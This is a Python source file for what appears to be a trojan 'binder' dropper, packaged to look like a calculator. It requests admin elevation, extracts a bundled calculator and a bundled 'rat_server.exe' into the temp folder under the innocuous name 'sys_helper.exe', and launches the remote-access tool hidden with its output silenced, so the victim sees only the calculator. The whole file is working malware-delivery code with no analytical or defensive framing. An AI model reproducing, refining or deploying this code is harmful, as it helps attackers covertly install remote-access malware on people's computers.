import sys
import os
import tempfile
import subprocess
import ctypes
import win32con
import win32api
import win32event
import winerror


def check_mutex():
    """Atomic mutex check with proper error handling"""
    mutex_name = "Global\\PyRatBinder"
    try:
        mutex = win32event.CreateMutex(None, True, mutex_name)
        last_error = win32api.GetLastError()

        # Both methods shown for reference
        if last_error in (winerror.ERROR_ALREADY_EXISTS, 183):
            ctypes.windll.user32.MessageBoxW(
                0,
                "Calculator is already running",
                "System Alert",
                0x40
            )
            sys.exit(1)
    except Exception as e:
        ctypes.windll.user32.MessageBoxW(
            0,
            f"Failed to initialize security: {str(e)}",
            "Critical Error",
            0x10
        )
        sys.exit(1)
    finally:
        if 'mutex' in locals():
            win32api.CloseHandle(mutex)

def main():
    # Use proper temp directory
    temp_dir = tempfile.gettempdir()

    try:
        # Extract calculator with proper permissions
        calc_path = os.path.join(temp_dir, "win_calc.exe")
        with open(calc_path, 'wb') as f:
            f.write(open(os.path.join(sys._MEIPASS, 'calc.exe'), 'rb').read())

        # Extract RAT server
        rat_path = os.path.join(temp_dir, "sys_helper.exe")
        with open(rat_path, 'wb') as f:
            f.write(open(os.path.join(sys._MEIPASS, 'rat_server.exe'), 'rb').read())

        # Start processes
        calc_proc = subprocess.Popen([calc_path],
                                     creationflags=subprocess.CREATE_NO_WINDOW)
        rat_proc = subprocess.Popen([rat_path],
                                    creationflags=subprocess.SW_HIDE | subprocess.CREATE_NO_WINDOW,
                                    stdin=subprocess.DEVNULL,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL)

        # Immediately exit after spawning
        sys.exit(0)

    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)


def elevate():
    """Admin elevation with DLL workaround"""
    if sys.platform == 'win32':
        if ctypes.windll.shell32.IsUserAnAdmin():
            return

        # Only pass --dll-dir if _MEIPASS exists
        meipass = getattr(sys, '_MEIPASS', '')
        args = [sys.argv[0]]
        if meipass:
            args.extend(['--dll-dir', meipass])

        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            sys.executable,
            ' '.join(f'"{arg}"' for arg in args),
            None,
            1
        )
        sys.exit(0)


if __name__ == "__main__":
    check_mutex()
    if '--dll-dir' in sys.argv:
        dll_dir = sys.argv[sys.argv.index('--dll-dir') + 1]
        os.environ['PATH'] = f"{dll_dir};{os.environ['PATH']}"
    elevate()
    main()
